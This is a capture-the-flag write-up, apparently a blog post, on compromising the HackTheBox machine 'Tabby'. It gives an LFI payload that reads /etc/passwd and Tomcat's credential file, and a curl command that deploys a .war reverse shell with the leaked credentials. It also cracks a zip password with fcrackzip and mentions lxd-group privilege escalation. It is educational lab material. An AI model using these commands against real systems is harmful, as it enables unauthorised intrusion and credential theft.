---
id: 3532
title: 'Hackthebox &#8211; Tabby'
date: '2022-04-15T12:07:30+00:00'
author: vedanttare
excerpt: 'In this post, we are going to be pwning "Tabby" from Hackthebox.'
layout: post
guid: 'http://vedanttare.com/?p=3532'
permalink: /hackthebox-tabby/
powerkit_share_buttons_transient_facebook:
    - '1692134049'
powerkit_share_buttons_transient_pinterest:
    - '1727803909'
image: 'http://vedanttare.com/wp-content/uploads/2022/04/Screenshot-2022-09-22-at-3.28.45-PM-1-496x166.png'
categories:
    - Writeups
---

![](http://vedanttare.com/wp-content/uploads/2022/04/Screenshot-2022-09-25-at-11.21.40-AM.png)

IP addr: 10.10.10.194,

Misc Info: Email id found – sales@megahosting.htb

## Enumeration

Starting off with a basic nmap scan: `sudo nmap -sC -sV -O -p- -oA nmap/tabby 10.10.10.194`, we get,

Checking on port 80, on megahosting website, there is an LFI in file parameter:  
`http://www.megahosting.htb/news.php?file=../../../../../etc/passwd`

![](http://vedanttare.com/wp-content/uploads/2022/04/etcpasswd-file.png)

Also add www.megahosting.htb to /etc/hosts. This domain is showed when navigated to the IP address on port 80. Now there was a apache tomcat 9 (9.0.31) server running on 8080.

![](http://vedanttare.com/wp-content/uploads/2022/04/port-8080.png)

It was leaking many paths, which were the local paths to the tomcat server hosting. From there we can try and retrieve the username:password file to get creds and login to the manager app and upload a .war rev shell.  
Credentials file path: `http://10.10.10.194:8080/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml`

![](http://vedanttare.com/wp-content/uploads/2022/04/tomcat-creds.png)

From here we could get the credentials:

![](http://vedanttare.com/wp-content/uploads/2022/04/Screenshot-2022-04-15-at-5.28.33-PM.png)

We could also check for the creds in the repeater tab of burp:

![](http://vedanttare.com/wp-content/uploads/2022/04/creds-from-repeater.png)

Now there was a problem we could only login to the host-manager app and not the manager app, so we could not use the gui to upload a .war rev shell. Hence, we used curl to upload the file to the default location in the manager app:

`curl -v -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war "http://10.10.10.194:8080/manager/text/deploy?path=/shelling`

![](http://vedanttare.com/wp-content/uploads/2022/04/curl-upload.png)

Now setting up a netcat listener and then calling the file using curl again:  
`curl http://10.10.10.194:8080/shelling (path which we had specified while uploading)`

And BOOM!…We get a rev shell!!!!

## Privilege Escalation

For privesc we had to unzip a zipped backup file which was in /var/www/html/files/16(something)\_backup.zip. We then used fcrackzip to decrypt the password of the file:  
`fcrackzip -D -p rockyou.txt 16(something)_backup.zip`

Hence, we got the password as: `admin@it`

We checked the zipped file by unzipping it by providing the password but we didn’t find anything interesting there. So, we just used that password to switch to ash user:  
`su ash`  
`enter password: admin@it`

And BOOM!!!…We got logged in as user ash.

Now, for root privesc we saw that the ash user was a member of the `lxd` group. So, we created and image using `lxd/lxc` and got root!!!!!

First method to escalate privileges using `lxd` group:

![](http://vedanttare.com/wp-content/uploads/2022/04/lxd-privesc-1.png)

Second method to escalate privileges using `lxd` group:

![](http://vedanttare.com/wp-content/uploads/2022/04/lxd-2.png)

Important links and resources:

[https://www.hackingarticles.in/lxd-privilege-escalation/](<LINK: https://www.hackingarticles.in/lxd-privilege-escalation/>)

[https://debian.pkgs.org/10/debian-main-amd64/tomcat9\_9.0.31-1~deb10u2\_all.deb.html](https://debian.pkgs.org/10/debian-main-amd64/tomcat9_9.0.31-1~deb10u2_all.deb.html)

<https://packages.ubuntu.com/focal/all/tomcat9-common/filelist>

<https://packages.debian.org/sid/all/tomcat9/filelist>

<https://askubuntu.com/questions/135824/what-is-the-tomcat-installation-directory>

Check out my previous post:

<figure class="wp-block-embed is-type-wp-embed is-provider-vedant-tare wp-block-embed-vedant-tare"><div class="wp-block-embed__wrapper">> [Hackthebox – Blocky](https://vedanttare.com/hackthebox-blocky/)

<iframe class="wp-embedded-content" data-secret="ml3ORxLUIa" frameborder="0" height="338" marginheight="0" marginwidth="0" sandbox="allow-scripts" scrolling="no" security="restricted" src="https://vedanttare.com/hackthebox-blocky/embed/#?secret=9zavCy4OwI#?secret=ml3ORxLUIa" style="position: absolute; clip: rect(1px, 1px, 1px, 1px);" title="“Hackthebox – Blocky” — VEDANT TARE" width="600"></iframe></div></figure>